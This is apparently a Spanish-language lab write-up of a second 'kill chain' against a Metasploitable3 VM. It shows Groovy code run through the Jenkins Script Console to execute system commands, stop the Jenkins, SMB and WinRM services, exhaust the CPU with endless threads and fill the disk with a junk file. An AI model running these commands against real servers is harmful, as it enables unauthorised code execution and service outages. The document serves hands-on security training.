---
title: "Lab.03 - Kill Chain 2"
date: 2026-06-20
categories: [lab, setup]
tags: [kill Chain2, jenkins, metasploitable, kali]
---
## **KILL CHAIN 2: Jenkins Script Console RCE** 

## **1. ¿Qué es Groovy y por qué da acceso total?

**Groovy** es el lenguaje que usa Jenkins para ejecutar instrucciones dentro del servidor. Si una persona tiene acceso a la consola Groovy, puede darle órdenes directamente a la máquina donde está instalado **Jenkins**,** como si estuviera sentado frente a ella. Por ejemplo, puede ver información del sistema, leer archivos, ejecutar programas o intentar detener servicios. Por eso se dice que Groovy puede dar mucho control sobre el servidor: no porque sea peligroso por sí mismo, sino porque permite que Jenkins haga prácticamente todo lo que tiene permitido hacer en esa computadora.

## **2. Prerequisito: acceso a la red interna**
En un entorno real, este tipo de servidor suele estar protegido y disponible únicamente para usuarios o equipos que ya se encuentran dentro de la infraestructura de la organización. Por ello, antes de iniciar este Kill Chain se asume que el atacante ya ha conseguido algún nivel de acceso previo, ya sea mediante el compromiso de otro equipo, el uso indebido de credenciales válidas o la colaboración de una persona con acceso autorizado. 

En nuestro caso, esta condición se relaciona con el Kill Chain 1, donde se obtuvo acceso mediante un ataque de fuerza bruta, permitiendo identificar credenciales válidas, reconocer los privilegios asociados a la cuenta comprometida y recopilar información del sistema. A partir de ese punto, se asumió una presencia inicial dentro del entorno objetivo. 

Para la presente práctica, esta situación se simuló colocando Kali y Metasploitable3 en la misma red virtual, lo que permitió interactuar directamente con Jenkins y continuar con las fases de reconocimiento, enumeración y explotación.

## **3. Ejecución en Groovy**
## 3.1. Verificar que Jenkins está activo antes de intentar conectar

     Get-Service | Where-Object {$_.DisplayName -like "*jenkins*"}
     netstat -ano | findstr :8484
     curl -s -o /dev/null -w "%{http_code}" http://10.0.2.15:8484/

![KILL2.1.2](/assets/KILL2/KILL2.1.2.png)

![KILL2.1.3](/assets/KILL2/KILL2.1.3.png)


En **Metasploitable3, Jenkins** está configurado para funcionar directamente desde la ruta principal del servidor. Por ello, la consola de scripts se encuentra en **/script**. Si se intenta acceder usando una ruta como **/jenkins**, el servidor devuelve un **Error 404 (página no encontrada)** porque esa ubicación no existe en esta configuración.

Abrir el browser en Kali y navegar a:

     http://10.0.2.15:8484/jenkins    # Error
     http://10.0.2.15:8484/script     #Abre Jenkins

![KILL2.2.1](/assets/KILL2/KILL2.2.1.png)

En la consola Script de Jenkins:

![KILL2.2.2](/assets/KILL2/KILL2.2.2.png)

En **GROOVY de Kali**: 
Lo que has demostrado es que desde la Script Console se pueden ejecutar comandos del sistema **(whoami, ipconfig)**.

     println "cmd /c whoami".execute().text
     def cmd = "cmd /c ipconfig"
     def proc = cmd.execute()
     proc.waitFor()
     println proc.text

![KILL2.2.3](/assets/KILL2/KILL2.2.3.png)
![KILL2.2.4](/assets/KILL2/KILL2.2.4.png)

**NOTA 1:** El que salga como resultado: **nt authority\local service** significa que ***Jenkins*** está corriendo como la cuenta integrada de Windows llamada Local Service.

**NOTA 2:** La explotación permitió la ejecución remota de comandos a través de Jenkins. El comando **whoami** reveló que los procesos se ejecutaban bajo la cuenta **NT AUTHORITY\LOCAL SERVICE**, indicando que la aplicación operaba con **privilegios restringidos** y no con privilegios administrativos."

## **4. IMPACTO: DENEGACIÓN DE SERVICIO (DoS)**
## 4.1. Detener el propio servicio Jenkins:

Se utilizó: Groovy de Jenkins

     "cmd /c net stop jenkins".execute()

***NOTA 1:*** "La ejecución del comando generó un **objeto de proceso (java.lang.ProcessImpl)**, indicando que Jenkins intentó lanzar el proceso solicitado. Posteriormente se verificó el estado del servicio observando si la plataforma continuaba accesible. La interrupción del acceso al servicio se consideró evidencia de impacto sobre la disponibilidad."

![KILL2.2.5](/assets/KILL2/KILL2.2.5.png)

***NOTA 2:*** Se obtuvo acceso a la Script Console de Jenkins y se logró ejecutar comandos en el sistema. Esto permitió afectar la disponibilidad del servicio, demostrando el riesgo que representa una configuración insegura de la consola administrativa.

## 4.2. Detener servicios críticos de Windows:

**Detener el servidor de archivos SMB**
Código en Groovy:

     "cmd /c net stop lanmanserver".execute()

![KILL2.2.6](/assets/KILL2/KILL2.2.6.png)

**Detener el servicio de acceso remoto WinRM**
Código en Groovy:
   
     "cmd /c net stop winrm".execute()

![KILL2.2.7](/assets/KILL2/KILL2.2.7.png)

## 4.3. Agotar CPU (fork bomb en Groovy):

Código en Groovy:

    while (true) {
        Thread.start { while (true) {} }
    }

***NOTA:*** Este código crea una gran cantidad de tareas al mismo tiempo y hace que cada una trabaje sin detenerse nunca. Como resultado, el procesador (CPU) se satura cada vez más hasta que la computadora o el servicio se vuelven extremadamente lentos o dejan de responder. En términos simples, intenta consumir todos los recursos disponibles de la máquina para afectar su funcionamiento normal.

**Jenkins antes del agotamiento:**

![KILL2.2.8](/assets/KILL2/KILL2.2.8.png)

**Carga de la página Jenkins después del agotamiento:** Vista de nueva pestaña con el URL de la página y vista del Script Console de Jenkins:

![KILL2.2.9](/assets/KILL2/KILL2.2.9.png)

**Vista del agotamiento en Kali vs Metasploitable**.

**En Metasploitable:**
**Opción A:** ingresar el comando para ver el consumo porcentual del CPU en la máquina víctima.

         Get-Counter '\Processor(_Total)\% Processor Time'

**Opción B:** abrir ***Windows Task Manager (Administrador de tarea)*** para visualizar el consumo del procesador, CPU y memoria en tiempo real.

![KILL2.2.10](/assets/KILL2/KILL2.2.10.png)

Se reinicia la máquina virtual para recuperar el acceso a Metasploitable.

![KILL2.2.11](/assets/KILL2/KILL2.2.11.png)

## 4.4. Llenar el disco con un archivo basura:

El siguiente código **crea un archivo muy grande** llenándolo con texto repetido miles de veces. En pocas palabras, su objetivo es ocupar espacio en el disco rápidamente, pudiendo afectar el almacenamiento disponible y el rendimiento del sistema si se ejecuta varias veces o con archivos aún más grandes.

Código en Groovy:

     def f = new File("C:\\Windows\\Temp\\bomb.txt")
     def writer = f.newWriter()
     (1..500000).each { writer.writeLine("A" * 1000) }
     writer.close()
     println "Escrito: ${f.length() / 1024 / 1024} MB"

**Vista** del ingreso del archivo basura en Jenkins a través de Kali:

![KILL2.2.12](/assets/KILL2/KILL2.2.12.png)

**Vista** de la ruta **"C:\\Windows\\Temp\\bomb.txt"** ANTES del ingreso de la basura denominada **"bomb.txt"**. Solo se visualizan 159 ítems.

![KILL2.2.13](/assets/KILL2/KILL2.2.13.png)

Creación del archivo basura denominado **"bomb.txt"**. Ahora se visualizan 160 ítems.

![KILL2.2.14](/assets/KILL2/KILL2.2.14.png)











